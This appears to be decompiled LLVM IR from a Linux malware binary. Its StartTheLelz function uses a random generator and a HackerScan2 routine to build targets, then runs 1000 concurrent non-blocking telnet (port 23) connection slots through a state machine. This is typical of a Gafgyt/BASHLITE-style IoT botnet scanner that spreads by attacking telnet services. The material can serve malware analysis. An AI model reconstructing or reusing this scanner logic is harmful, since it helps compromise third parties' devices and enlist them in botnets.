dec_label_pc_804c804:                             ; preds = %dec_label_pc_804c7cb, %dec_label_pc_804c7f2, %dec_label_pc_804c7f5.preheader
  %storemerge = phi i32 [ 0, %dec_label_pc_804c7f5.preheader ], [ 0, %dec_label_pc_804c7f2 ], [ 1, %dec_label_pc_804c7cb ]
  %v2_804c807 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804c807, i32* @ebp, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %storemerge117, { 1, 0 }
  uselistorder i32 %v4_804c7b0, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_804c804, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804c7cb, { 1, 0 }
}

define i32 @StartTheLelz(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-336 = alloca i32, align 4
  %stack_var_-332 = alloca i32, align 4
  %stack_var_-328 = alloca i32, align 4
  %stack_var_-320 = alloca i32, align 4
  %stack_var_-600 = alloca i32, align 4
  %stack_var_-608 = alloca i32, align 4
  %stack_var_-636 = alloca i32, align 4
  %v15_804c80f = ptrtoint i32* %stack_var_-636 to i32
  store i32 1000, i32* %eax.global-to-local, align 4
  %v2_804c82e = call i32 @__GI_time(i32* null)
  store i32 %v2_804c82e, i32* %eax.global-to-local, align 4
  store i32 %v2_804c82e, i32* @ebx, align 4
  %v1_804c838 = call i32 @rand_cmwc(i32 0)
  %v1_804c83d = load i32, i32* @ebx, align 4
  %v2_804c83d = xor i32 %v1_804c83d, %v1_804c838
  store i32 %v2_804c83d, i32* @eax, align 4
  %v1_804c843 = call i32 @srand(i32 %v2_804c83d)
  store i32 %v1_804c843, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-608, align 4
  %v1_804c859 = call i32 @htons(i32 23)
  %v15_804c86e = ptrtoint i32* %stack_var_-600 to i32
  store i32 %v15_804c86e, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-600, align 4
  %v1_804c886 = call i32 @malloc(i32 1025)
  store i32 %v1_804c886, i32* %edx.global-to-local, align 4
  store i32 1025, i32* %eax.global-to-local, align 4
  %v3_804c8a2 = inttoptr i32 %v1_804c886 to i8*
  %v4_804c8a2 = call i32 @__GI_memset(i8* %v3_804c8a2, i32 0, i32 1025)
  %v1_804c8d7 = add i32 %v15_804c80f, -28001
  %v2_804c8da = and i32 %v1_804c8d7, -16
  store i32 5000, i32* %edx.global-to-local, align 4
  %v1_804c8fd = inttoptr i32 %v2_804c8da to i8*
  store i32 %v2_804c8da, i32* @edi, align 4
  %v1_804c902 = and i32 %v1_804c8d7, -256
  store i32 %v1_804c902, i32* %eax.global-to-local, align 4
  %v5_804c904 = call i8* @_memset(i8* %v1_804c8fd, i32 %v1_804c902, i32 5000)
  store i32 0, i32* %eax.global-to-local, align 4
  %v2_804c963 = or i32 %v2_804c8da, 9
  br label %dec_label_pc_804c90f

dec_label_pc_804c90f:                             ; preds = %entry, %dec_label_pc_804c90f
  %storemerge245 = phi i32 [ 0, %entry ], [ %v4_804c988, %dec_label_pc_804c90f ]
  %v2_804c923 = mul nuw nsw i32 %storemerge245, 28
  %v2_804c925 = add i32 %v2_804c923, %v2_804c8da
  store i32 %v2_804c925, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v2_804c92d = inttoptr i32 %v2_804c925 to i32*
  store i32 0, i32* %v2_804c92d, align 4
  %v0_804c92f = load i32, i32* %eax.global-to-local, align 4
  %v1_804c92f = add i32 %v0_804c92f, 4
  store i32 %v1_804c92f, i32* %eax.global-to-local, align 4
  %v0_804c932 = load i32, i32* %edx.global-to-local, align 4
  %v2_804c932 = inttoptr i32 %v1_804c92f to i32*
  store i32 %v0_804c932, i32* %v2_804c932, align 4
  %v0_804c934 = load i32, i32* %eax.global-to-local, align 4
  %v1_804c934 = add i32 %v0_804c934, 4
  store i32 %v1_804c934, i32* %eax.global-to-local, align 4
  %v0_804c937 = load i32, i32* %edx.global-to-local, align 4
  %v2_804c937 = inttoptr i32 %v1_804c934 to i32*
  store i32 %v0_804c937, i32* %v2_804c937, align 4
  %v0_804c939 = load i32, i32* %eax.global-to-local, align 4
  %v1_804c939 = add i32 %v0_804c939, 4
  store i32 %v1_804c939, i32* %eax.global-to-local, align 4
  %v0_804c93c = load i32, i32* %edx.global-to-local, align 4
  %v2_804c93c = inttoptr i32 %v1_804c939 to i32*
  store i32 %v0_804c93c, i32* %v2_804c93c, align 4
  %v0_804c93e = load i32, i32* %eax.global-to-local, align 4
  %v1_804c93e = add i32 %v0_804c93e, 4
  store i32 %v1_804c93e, i32* %eax.global-to-local, align 4
  %v0_804c941 = load i32, i32* %edx.global-to-local, align 4
  %v2_804c941 = inttoptr i32 %v1_804c93e to i32*
  store i32 %v0_804c941, i32* %v2_804c941, align 4
  %v0_804c943 = load i32, i32* %eax.global-to-local, align 4
  %v1_804c943 = add i32 %v0_804c943, 4
  store i32 %v1_804c943, i32* %eax.global-to-local, align 4
  %v0_804c946 = load i32, i32* %edx.global-to-local, align 4
  %v2_804c946 = inttoptr i32 %v1_804c943 to i32*
  store i32 %v0_804c946, i32* %v2_804c946, align 4
  %v0_804c948 = load i32, i32* %eax.global-to-local, align 4
  %v1_804c948 = add i32 %v0_804c948, 4
  %v0_804c94b = load i32, i32* %edx.global-to-local, align 4
  %v2_804c94b = inttoptr i32 %v1_804c948 to i32*
  store i32 %v0_804c94b, i32* %v2_804c94b, align 4
  %v3_804c963 = add i32 %v2_804c963, %v2_804c923
  %v4_804c963 = inttoptr i32 %v3_804c963 to i8*
  store i8 1, i8* %v4_804c963, align 1
  %v1_804c980 = add i32 %v2_804c925, 24
  store i32 %v1_804c980, i32* %edx.global-to-local, align 4
  %v2_804c986 = inttoptr i32 %v1_804c980 to i32*
  store i32 %v1_804c886, i32* %v2_804c986, align 4
  %v4_804c988 = add nuw nsw i32 %storemerge245, 1
  store i32 %v4_804c988, i32* %eax.global-to-local, align 4
  %v15_804c98e = icmp eq i32 %v4_804c988, 1000
  br i1 %v15_804c98e, label %dec_label_pc_804c997.preheader, label %dec_label_pc_804c90f

dec_label_pc_804c997.preheader:                   ; preds = %dec_label_pc_804c90f
  %v2_804c868 = ptrtoint i32* %stack_var_-608 to i32
  %v2_804cddd = ptrtoint i32* %stack_var_-320 to i32
  %tmp38 = bitcast i32* %stack_var_-320 to i8*
  %v2_804ce60 = ptrtoint i32* %stack_var_-328 to i32
  %v2_804ceb8 = ptrtoint i32* %stack_var_-332 to i32
  %v2_804cebf = ptrtoint i32* %stack_var_-336 to i32
  %v2_804ca08 = or i32 %v2_804c8da, 8
  %v2_804cb3a = or i32 %v2_804c8da, 11
  %v2_804cb74 = or i32 %v2_804c8da, 10
  %v2_804d6c0 = add i32 %v2_804c8da, 16
  br label %dec_label_pc_804c997

dec_label_pc_804c997:                             ; preds = %dec_label_pc_804dac9, %dec_label_pc_804c997.preheader
  %stack_var_-624.0 = phi i32 [ %tmp4, %dec_label_pc_804c997.preheader ], [ %stack_var_-624.1, %dec_label_pc_804dac9 ]
  %stack_var_-620.0 = phi i32 [ %tmp5, %dec_label_pc_804c997.preheader ], [ %stack_var_-620.1, %dec_label_pc_804dac9 ]
  br label %dec_label_pc_804c9a3

dec_label_pc_804c9a3:                             ; preds = %dec_label_pc_804c997, %dec_label_pc_804dac9
  %storemerge = phi i32 [ 0, %dec_label_pc_804c997 ], [ %v4_804dac9, %dec_label_pc_804dac9 ]
  %storemerge43 = phi i32 [ 0, %dec_label_pc_804c997 ], [ %v4_804dac9, %dec_label_pc_804dac9 ]
  %stack_var_-620.242 = phi i32 [ %stack_var_-620.0, %dec_label_pc_804c997 ], [ %stack_var_-620.1, %dec_label_pc_804dac9 ]
  %stack_var_-624.241 = phi i32 [ %stack_var_-624.0, %dec_label_pc_804c997 ], [ %stack_var_-624.1, %dec_label_pc_804dac9 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v1_804c9a9 = mul nuw nsw i32 %storemerge43, 4
  store i32 %v1_804c9a9, i32* %edx.global-to-local, align 4
  %v2_804c9b7 = mul nuw nsw i32 %storemerge43, 28
  %v2_804c9b9 = add i32 %v2_804c9b7, %v2_804c8da
  %v1_804c9bb = add i32 %v2_804c9b9, 16
  store i32 %v1_804c9bb, i32* %eax.global-to-local, align 4
  %v1_804c9be = inttoptr i32 %v1_804c9bb to i32*
  %v2_804c9be = load i32, i32* %v1_804c9be, align 4
  store i32 %v2_804c9be, i32* %eax.global-to-local, align 4
  %v1_804c9c0 = icmp eq i32 %v2_804c9be, 0
  %v1_804c9c2 = icmp eq i1 %v1_804c9c0, false
  br i1 %v1_804c9c2, label %dec_label_pc_804c9f2, label %dec_label_pc_804c9c4

dec_label_pc_804c9c4:                             ; preds = %dec_label_pc_804c9a3
  store i32 %storemerge43, i32* @ebx, align 4
  %v0_804c9c7 = load i32, i32* @esp, align 4
  %v1_804c9ca = add i32 %v0_804c9c7, -16
  %v2_804c9ca = inttoptr i32 %v1_804c9ca to i32*
  store i32 0, i32* %v2_804c9ca, align 4
  %v1_804c9cc = inttoptr i32 %storemerge43 to i32*
  %v2_804c9cc = call i32 @__GI_time(i32* %v1_804c9cc)
  store i32 %v2_804c9cc, i32* @esi, align 4
  %v0_804c9d9 = load i32, i32* @ebx, align 4
  %v1_804c9db = mul i32 %v0_804c9d9, 4
  store i32 %v1_804c9db, i32* %edx.global-to-local, align 4
  %v2_804c9e9 = mul i32 %v0_804c9d9, 28
  %v2_804c9eb = add i32 %v2_804c9e9, %v2_804c8da
  %v1_804c9ed = add i32 %v2_804c9eb, 16
  store i32 %v1_804c9ed, i32* %eax.global-to-local, align 4
  %v2_804c9f0 = inttoptr i32 %v1_804c9ed to i32*
  store i32 %v2_804c9cc, i32* %v2_804c9f0, align 4
  br label %dec_label_pc_804c9f2

dec_label_pc_804c9f2:                             ; preds = %dec_label_pc_804c9a3, %dec_label_pc_804c9c4
  store i32 %v1_804c9a9, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9b7, i32* %eax.global-to-local, align 4
  %v3_804ca08 = add i32 %v2_804ca08, %v2_804c9b7
  %v4_804ca08 = inttoptr i32 %v3_804ca08 to i8*
  %v5_804ca08 = load i8, i8* %v4_804ca08, align 4
  %v6_804ca08 = zext i8 %v5_804ca08 to i32
  %v8_804ca08 = and i32 %v2_804c9b7, -256
  %v9_804ca08 = or i32 %v6_804ca08, %v8_804ca08
  store i32 %v9_804ca08, i32* %eax.global-to-local, align 4
  store i32 %v6_804ca08, i32* %edx.global-to-local, align 4
  store i32 %v6_804ca08, i32* @edi, align 4
  %v1_804ca2c = mul nuw nsw i32 %v6_804ca08, 4
  %v2_804ca2c = add nuw nsw i32 %v1_804ca2c, 134582376
  %v3_804ca2c = inttoptr i32 %v2_804ca2c to i32*
  %v4_804ca2c = load i32, i32* %v3_804ca2c, align 4
  store i32 %v4_804ca2c, i32* %eax.global-to-local, align 4
  switch i8 %v5_804ca08, label %dec_label_pc_804dac9 [
    i8 0, label %dec_label_pc_804ca35
    i8 1, label %dec_label_pc_804cdd3
    i8 2, label %dec_label_pc_804d123
    i8 3, label %dec_label_pc_804d254
    i8 4, label %dec_label_pc_804d3b2
    i8 5, label %dec_label_pc_804d4e3
    i8 6, label %dec_label_pc_804d641
    i8 7, label %dec_label_pc_804d964
  ]

dec_label_pc_804ca35:                             ; preds = %dec_label_pc_804c9f2
  store i32 %v1_804c9a9, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9b7, i32* %eax.global-to-local, align 4
  %v3_804ca4b = add i32 %v2_804c963, %v2_804c9b7
  %v4_804ca4b = inttoptr i32 %v3_804ca4b to i8*
  %v5_804ca4b = load i8, i8* %v4_804ca4b, align 1
  %v10_804ca4f = icmp eq i8 %v5_804ca4b, 1
  %v1_804ca51 = icmp eq i1 %v10_804ca4f, false
  store i32 %v1_804c9a9, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9b7, i32* %eax.global-to-local, align 4
  br i1 %v1_804ca51, label %dec_label_pc_804cb00, label %dec_label_pc_804ca57

dec_label_pc_804ca57:                             ; preds = %dec_label_pc_804ca35
  %v1_804ca6f = add i32 %v2_804c9b9, 24
  store i32 %v1_804ca6f, i32* %eax.global-to-local, align 4
  %v1_804ca72 = inttoptr i32 %v1_804ca6f to i32*
  %v2_804ca72 = load i32, i32* %v1_804ca72, align 4
  store i32 %v2_804c9b9, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v2_804ca95 = inttoptr i32 %v2_804c9b9 to i32*
  store i32 0, i32* %v2_804ca95, align 4
  %v0_804ca97 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ca97 = add i32 %v0_804ca97, 4
  store i32 %v1_804ca97, i32* %eax.global-to-local, align 4
  %v0_804ca9a = load i32, i32* %edx.global-to-local, align 4
  %v2_804ca9a = inttoptr i32 %v1_804ca97 to i32*
  store i32 %v0_804ca9a, i32* %v2_804ca9a, align 4
  %v0_804ca9c = load i32, i32* %eax.global-to-local, align 4
  %v1_804ca9c = add i32 %v0_804ca9c, 4
  store i32 %v1_804ca9c, i32* %eax.global-to-local, align 4
  %v0_804ca9f = load i32, i32* %edx.global-to-local, align 4
  %v2_804ca9f = inttoptr i32 %v1_804ca9c to i32*
  store i32 %v0_804ca9f, i32* %v2_804ca9f, align 4
  %v0_804caa1 = load i32, i32* %eax.global-to-local, align 4
  %v1_804caa1 = add i32 %v0_804caa1, 4
  store i32 %v1_804caa1, i32* %eax.global-to-local, align 4
  %v0_804caa4 = load i32, i32* %edx.global-to-local, align 4
  %v2_804caa4 = inttoptr i32 %v1_804caa1 to i32*
  store i32 %v0_804caa4, i32* %v2_804caa4, align 4
  %v0_804caa6 = load i32, i32* %eax.global-to-local, align 4
  %v1_804caa6 = add i32 %v0_804caa6, 4
  store i32 %v1_804caa6, i32* %eax.global-to-local, align 4
  %v0_804caa9 = load i32, i32* %edx.global-to-local, align 4
  %v2_804caa9 = inttoptr i32 %v1_804caa6 to i32*
  store i32 %v0_804caa9, i32* %v2_804caa9, align 4
  %v0_804caab = load i32, i32* %eax.global-to-local, align 4
  %v1_804caab = add i32 %v0_804caab, 4
  store i32 %v1_804caab, i32* %eax.global-to-local, align 4
  %v0_804caae = load i32, i32* %edx.global-to-local, align 4
  %v2_804caae = inttoptr i32 %v1_804caab to i32*
  store i32 %v0_804caae, i32* %v2_804caae, align 4
  %v0_804cab0 = load i32, i32* %eax.global-to-local, align 4
  %v1_804cab0 = add i32 %v0_804cab0, 4
  %v0_804cab3 = load i32, i32* %edx.global-to-local, align 4
  %v2_804cab3 = inttoptr i32 %v1_804cab0 to i32*
  store i32 %v0_804cab3, i32* %v2_804cab3, align 4
  store i32 %v1_804ca6f, i32* %edx.global-to-local, align 4
  store i32 %v2_804ca72, i32* @eax, align 4
  store i32 %v2_804ca72, i32* %v1_804ca72, align 4
  store i32 %storemerge43, i32* @ebx, align 4
  %v1_804cad8 = call i32 @HackerScan2(i32 %v6_804ca08)
  %v0_804cae2 = load i32, i32* @ebx, align 4
  %v1_804cae4 = mul i32 %v0_804cae2, 4
  store i32 %v1_804cae4, i32* %edx.global-to-local, align 4
  %v2_804caf2 = mul i32 %v0_804cae2, 28
  %v2_804caf4 = add i32 %v2_804caf2, %v2_804c8da
  %v1_804caf6 = add i32 %v2_804caf4, 4
  store i32 %v1_804caf6, i32* %eax.global-to-local, align 4
  %v2_804caf9 = inttoptr i32 %v1_804caf6 to i32*
  store i32 %v1_804cad8, i32* %v2_804caf9, align 4
  br label %dec_label_pc_804cc12

dec_label_pc_804cb00:                             ; preds = %dec_label_pc_804ca35
  %v5_804cb16 = load i8, i8* %v4_804ca4b, align 1
  %v6_804cb16 = zext i8 %v5_804cb16 to i32
  %v9_804cb16 = or i32 %v6_804cb16, %v8_804ca08
  store i32 %v9_804cb16, i32* %eax.global-to-local, align 4
  %v4_804cb1a = icmp eq i8 %v5_804cb16, 0
  %v1_804cb1c = icmp eq i1 %v4_804cb1a, false
  br i1 %v1_804cb1c, label %dec_label_pc_804cc12, label %dec_label_pc_804cb22

dec_label_pc_804cb22:                             ; preds = %dec_label_pc_804cb00
  store i32 %v1_804c9a9, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9b7, i32* %eax.global-to-local, align 4
  %v3_804cb3a = add i32 %v2_804cb3a, %v2_804c9b7
  %v4_804cb3a = inttoptr i32 %v3_804cb3a to i8*
  %v5_804cb3a = load i8, i8* %v4_804cb3a, align 1
  %v1_804cb3e = add i8 %v5_804cb3a, 1
  store i8 %v1_804cb3e, i8* %v4_804cb3a, align 1
  store i32 %v1_804c9a9, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9b7, i32* %eax.global-to-local, align 4
  %v3_804cb74 = add i32 %v2_804cb74, %v2_804c9b7
  %v4_804cb74 = inttoptr i32 %v3_804cb74 to i8*
  %v5_804cb74 = load i8, i8* %v4_804cb74, align 2
  %v6_804cb74 = zext i8 %v5_804cb74 to i32
  %v9_804cb74 = or i32 %v6_804cb74, %v8_804ca08
  %v1_804cb78 = add i32 %v9_804cb74, 1
  store i32 %v1_804cb78, i32* @esi, align 4
  %v1_804cb92 = trunc i32 %v1_804cb78 to i8
  store i8 %v1_804cb92, i8* %v4_804cb74, align 2
  store i32 %v1_804c9a9, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9b7, i32* %eax.global-to-local, align 4
  %v5_804cbac = load i8, i8* %v4_804cb3a, align 1
  %v10_804cbb0 = icmp eq i8 %v5_804cbac, 3
  %v1_804cbb2 = icmp eq i1 %v10_804cbb0, false
  store i32 %v1_804c9a9, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9b7, i32* %eax.global-to-local, align 4
  br i1 %v1_804cbb2, label %dec_label_pc_804cbd4, label %dec_label_pc_804cbb4

dec_label_pc_804cbb4:                             ; preds = %dec_label_pc_804cb22
  store i8 1, i8* %v4_804ca4b, align 1
  br label %dec_label_pc_804dac9

dec_label_pc_804cbd4:                             ; preds = %dec_label_pc_804cb22
  %v5_804cbea = load i8, i8* %v4_804cb74, align 2
  %v6_804cbea = zext i8 %v5_804cbea to i32
  %v9_804cbea = or i32 %v6_804cbea, %v8_804ca08
  store i32 %v9_804cbea, i32* %eax.global-to-local, align 4
  %v10_804cbee = icmp eq i8 %v5_804cbea, 3
  %v1_804cbf0 = icmp eq i1 %v10_804cbee, false
  br i1 %v1_804cbf0, label %dec_label_pc_804cc12, label %dec_label_pc_804cbf2

dec_label_pc_804cbf2:                             ; preds = %dec_label_pc_804cbd4
  store i32 %v1_804c9a9, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9b7, i32* %eax.global-to-local, align 4
  store i8 1, i8* %v4_804ca4b, align 1
  br label %dec_label_pc_804dac9

dec_label_pc_804cc12:                             ; preds = %dec_label_pc_804cbd4, %dec_label_pc_804cb00, %dec_label_pc_804ca57
  store i32 2, i32* %stack_var_-608, align 4
  %v0_804cc1b = load i32, i32* @esp, align 4
  %v1_804cc1e = add i32 %v0_804cc1b, -16
  %v2_804cc1e = inttoptr i32 %v1_804cc1e to i32*
  store i32 23, i32* %v2_804cc1e, align 4
  %v0_804cc20 = load i32, i32* %stack_var_-608, align 4
  %v1_804cc20 = call i32 @htons(i32 %v0_804cc20)
  %v0_804cc25 = load i32, i32* @esp, align 4
  store i32 0, i32* %stack_var_-600, align 4
  store i32 %v1_804c9a9, i32* %edx.global-to-local, align 4
  %v1_804cc5d = add i32 %v2_804c9b9, 4
  store i32 %v1_804cc5d, i32* %eax.global-to-local, align 4
  %v1_804cc60 = inttoptr i32 %v1_804cc5d to i32*
  %v2_804cc60 = load i32, i32* %v1_804cc60, align 4
  store i32 %v2_804cc60, i32* %eax.global-to-local, align 4
  store i32 %storemerge43, i32* @ebx, align 4
  %v1_804cc6e = add i32 %v0_804cc25, 8
  %v2_804cc6e = inttoptr i32 %v1_804cc6e to i32*
  store i32 0, i32* %v2_804cc6e, align 4
  %v1_804cc70 = add i32 %v0_804cc25, 4
  %v2_804cc70 = inttoptr i32 %v1_804cc70 to i32*
  store i32 1, i32* %v2_804cc70, align 4
  %v2_804cc72 = inttoptr i32 %v0_804cc25 to i32*
  store i32 2, i32* %v2_804cc72, align 4
  %v2_804cc74 = load i32, i32* %stack_var_-600, align 4
  %sext = mul i32 %v1_804cc20, 65536
  %v3_804cc74 = sdiv i32 %sext, 65536
  %v4_804cc74 = call i32 @socket(i32 %v3_804cc74, i32 %v2_804cc60, i32 %v2_804cc74)
  store i32 %v4_804cc74, i32* @esi, align 4
  %v0_804cc81 = load i32, i32* @ebx, align 4
  %v2_804cc91 = mul i32 %v0_804cc81, 28
  %v3_804cc93 = add i32 %v2_804cc91, %v2_804c8da
  %v4_804cc93 = inttoptr i32 %v3_804cc93 to i32*
  store i32 %v4_804cc74, i32* %v4_804cc93, align 4
  store i32 %v1_804c9a9, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9b7, i32* %eax.global-to-local, align 4
  %v3_804ccac = inttoptr i32 %v2_804c9b9 to i32*
  %v4_804ccac = load i32, i32* %v3_804ccac, align 4
  store i32 %v4_804ccac, i32* %eax.global-to-local, align 4
  %v10_804ccaf = icmp eq i32 %v4_804ccac, -1
  br i1 %v10_804ccaf, label %dec_label_pc_804dac9, label %dec_label_pc_804ccb8

dec_label_pc_804ccb8:                             ; preds = %dec_label_pc_804cc12
  store i32 %v1_804c9a9, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9b7, i32* %eax.global-to-local, align 4
  %v4_804ccce = load i32, i32* %v3_804ccac, align 4
  store i32 %v4_804ccce, i32* %eax.global-to-local, align 4
  %v0_804ccd1 = load i32, i32* @esp, align 4
  %v1_804ccd4 = add i32 %v0_804ccd1, -8
  %v2_804ccd4 = inttoptr i32 %v1_804ccd4 to i32*
  store i32 0, i32* %v2_804ccd4, align 4
  %v1_804ccd6 = add i32 %v0_804ccd1, -12
  %v2_804ccd6 = inttoptr i32 %v1_804ccd6 to i32*
  store i32 3, i32* %v2_804ccd6, align 4
  %v0_804ccd8 = load i32, i32* %eax.global-to-local, align 4
  %v2_804ccd8 = add i32 %v0_804ccd1, -16
  %v3_804ccd8 = inttoptr i32 %v2_804ccd8 to i32*
  store i32 %v0_804ccd8, i32* %v3_804ccd8, align 4
  %v1_804ccd9 = load i32, i32* %stack_var_-600, align 4
  %v3_804ccd9 = call i32 @__libc_fcntl(i32 %v2_804cc60, i32 %v1_804ccd9, i32 0)
  %v0_804ccde = load i32, i32* @esp, align 4
  %v12_804cce3 = or i32 %v3_804ccd9, 2048
  store i32 %v12_804cce3, i32* @ebx, align 4
  store i32 %v1_804c9a9, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9b7, i32* %eax.global-to-local, align 4
  %v4_804ccfc = load i32, i32* %v3_804ccac, align 4
  store i32 %v4_804ccfc, i32* %eax.global-to-local, align 4
  %v2_804cd02 = add i32 %v0_804ccde, 8
  %v3_804cd02 = inttoptr i32 %v2_804cd02 to i32*
  store i32 %v12_804cce3, i32* %v3_804cd02, align 4
  %v1_804cd03 = add i32 %v0_804ccde, 4
  %v2_804cd03 = inttoptr i32 %v1_804cd03 to i32*
  store i32 4, i32* %v2_804cd03, align 4
  %v0_804cd05 = load i32, i32* %eax.global-to-local, align 4
  %v3_804cd05 = inttoptr i32 %v0_804ccde to i32*
  store i32 %v0_804cd05, i32* %v3_804cd05, align 4
  %v1_804cd06 = load i32, i32* %stack_var_-600, align 4
  %v3_804cd06 = call i32 @__libc_fcntl(i32 %v2_804cc60, i32 %v1_804cd06, i32 0)
  %v0_804cd0b = load i32, i32* @esp, align 4
  store i32 %v2_804c868, i32* @ebx, align 4
  store i32 %v1_804c9a9, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9b7, i32* %eax.global-to-local, align 4
  %v4_804cd2a = load i32, i32* %v3_804ccac, align 4
  store i32 %v4_804cd2a, i32* %eax.global-to-local, align 4
  %v1_804cd30 = add i32 %v0_804cd0b, 8
  %v2_804cd30 = inttoptr i32 %v1_804cd30 to i32*
  store i32 16, i32* %v2_804cd30, align 4
  %v2_804cd32 = add i32 %v0_804cd0b, 4
  %v3_804cd32 = inttoptr i32 %v2_804cd32 to i32*
  store i32 %v2_804c868, i32* %v3_804cd32, align 4
  %v0_804cd33 = load i32, i32* %eax.global-to-local, align 4
  %v3_804cd33 = inttoptr i32 %v0_804cd0b to i32*
  store i32 %v0_804cd33, i32* %v3_804cd33, align 4
  %v1_804cd34 = load i32, i32* %stack_var_-600, align 4
  %v3_804cd34 = call i32 @__libc_connect(i32 %v2_804cc60, i32 %v1_804cd34, i32 0)
  store i32 %v3_804cd34, i32* %eax.global-to-local, align 4
  %v10_804cd3c = icmp eq i32 %v3_804cd34, -1
  %v1_804cd3f = icmp eq i1 %v10_804cd3c, false
  br i1 %v1_804cd3f, label %dec_label_pc_804cd92, label %dec_label_pc_804cd41

dec_label_pc_804cd41:                             ; preds = %dec_label_pc_804ccb8
  %v1_804cd41 = call i32 @__errno_location(i32 %v2_804cc60)
  store i32 %v1_804cd41, i32* %eax.global-to-local, align 4
  %v1_804cd46 = inttoptr i32 %v1_804cd41 to i32*
  %v2_804cd46 = load i32, i32* %v1_804cd46, align 4
  store i32 %v2_804cd46, i32* %eax.global-to-local, align 4
  %v9_804cd48 = icmp eq i32 %v2_804cd46, 115
  br i1 %v9_804cd48, label %dec_label_pc_804cd92, label %dec_label_pc_804cd4d

dec_label_pc_804cd4d:                             ; preds = %dec_label_pc_804cd41
  store i32 %v1_804c9a9, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9b7, i32* %eax.global-to-local, align 4
  %v4_804cd63 = load i32, i32* %v3_804ccac, align 4
  store i32 %v4_804cd63, i32* %eax.global-to-local, align 4
  %v0_804cd66 = load i32, i32* @esp, align 4
  %v2_804cd69 = add i32 %v0_804cd66, -16
  %v3_804cd69 = inttoptr i32 %v2_804cd69 to i32*
  store i32 %v4_804cd63, i32* %v3_804cd69, align 4
  %v1_804cd6a = call i32 @sclose(i32 %v2_804cc60)
  store i32 %v1_804c9a9, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9b7, i32* %eax.global-to-local, align 4
  store i8 1, i8* %v4_804ca4b, align 1
  br label %dec_label_pc_804dac9

dec_label_pc_804cd92:                             ; preds = %dec_label_pc_804cd41, %dec_label_pc_804ccb8
  store i8 1, i8* %v4_804ca08, align 4
  store i32 %v1_804c9a9, i32* %edx.global-to-local, align 4
  store i32 %v1_804c9bb, i32* %eax.global-to-local, align 4
  store i32 0, i32* %v1_804c9be, align 4
  br label %dec_label_pc_804dac9

dec_label_pc_804cdd3:                             ; preds = %dec_label_pc_804c9f2
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %v2_804cddd, i32* @edi, align 4
  %v5_804cde4 = call i8* @_memset(i8* %tmp38, i32 0, i32 32)
  store i32 %v1_804c9a9, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9b7, i32* %eax.global-to-local, align 4
  %v3_804ce02 = inttoptr i32 %v2_804c9b9 to i32*
  %v4_804ce02 = load i32, i32* %v3_804ce02, align 4
  %v2_804ce07 = udiv i32 %v4_804ce02, 32
  store i32 %v2_804ce07, i32* @ebx, align 4
  store i32 %v1_804c9a9, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9b7, i32* %eax.global-to-local, align 4
  %v4_804ce20 = load i32, i32* %v3_804ce02, align 4
  %v1_804ce23 = urem i32 %v4_804ce20, 32
  store i32 %v1_804ce23, i32* %eax.global-to-local, align 4
  %v0_804ce26 = load i32, i32* @ebp, align 4
  %v2_804ce26 = mul nuw nsw i32 %v2_804ce07, 4
  %v3_804ce26 = add nsw i32 %v2_804ce26, -316
  %v4_804ce26 = add i32 %v3_804ce26, %v0_804ce26
  %v5_804ce26 = inttoptr i32 %v4_804ce26 to i32*
  %v6_804ce26 = load i32, i32* %v5_804ce26, align 4
  %v9_804ce26 = shl i32 1, %v1_804ce23
  %v12_804ce26 = or i32 %v6_804ce26, %v9_804ce26
  store i32 %v12_804ce26, i32* %v5_804ce26, align 4
  store i32 0, i32* %stack_var_-328, align 4
  store i32 %v1_804c9a9, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9b7, i32* %eax.global-to-local, align 4
  %v4_804ce57 = load i32, i32* %v3_804ce02, align 4
  %v1_804ce5a = add i32 %v4_804ce57, 1
  store i32 %v1_804ce5a, i32* %edx.global-to-local, align 4
  %v0_804ce5d = load i32, i32* @esp, align 4
  %v2_804ce66 = add i32 %v0_804ce5d, -16
  %v3_804ce66 = inttoptr i32 %v2_804ce66 to i32*
  store i32 %v2_804ce60, i32* %v3_804ce66, align 4
  %v1_804ce67 = add i32 %v0_804ce5d, -20
  %v2_804ce67 = inttoptr i32 %v1_804ce67 to i32*
  store i32 0, i32* %v2_804ce67, align 4
  store i32 %v2_804cddd, i32* %eax.global-to-local, align 4
  %v2_804ce6f = add i32 %v0_804ce5d, -24
  %v3_804ce6f = inttoptr i32 %v2_804ce6f to i32*
  store i32 %v2_804cddd, i32* %v3_804ce6f, align 4
  %v1_804ce70 = add i32 %v0_804ce5d, -28
  %v2_804ce70 = inttoptr i32 %v1_804ce70 to i32*
  store i32 0, i32* %v2_804ce70, align 4
  %v0_804ce72 = load i32, i32* %edx.global-to-local, align 4
  %v2_804ce72 = add i32 %v0_804ce5d, -32
  %v3_804ce72 = inttoptr i32 %v2_804ce72 to i32*
  store i32 %v0_804ce72, i32* %v3_804ce72, align 4
